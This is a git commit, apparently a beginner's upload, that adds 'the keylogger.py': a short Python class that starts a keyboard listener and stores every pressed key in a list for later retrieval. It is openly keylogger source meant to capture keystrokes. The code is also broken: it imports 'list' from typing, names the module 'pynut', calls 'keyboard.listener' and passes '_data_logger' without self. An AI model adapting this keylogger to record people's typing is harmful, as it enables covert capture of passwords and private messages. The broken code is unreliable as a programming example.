b389f65c4035b889165f1c3314c221a03251ce6b
zevgordon <g0547873807@gmail.com>
2025-09-01 23:06:52 +0300

    Add files via upload

---
+++ the keylogger.py
@@ -0,0 +1,24 @@
+from abc import ABC
+from typing import list
+from pynut import keyboard
+
+class Ikeylogger(ABC):
+    def __init__(self):
+        self.listener=keyboard.listener(on_press=_data_logger)
+        self.data=[]
+
+    def _data_logger(self,key):
+        self.data.append(key)
+
+    def start_logging(self):
+        self.listener.start()
+
+    def stop_logging(self):
+        self.listener.stop()
+
+    def get_logged_keys(self):
+        return self.data
+
+
+
+
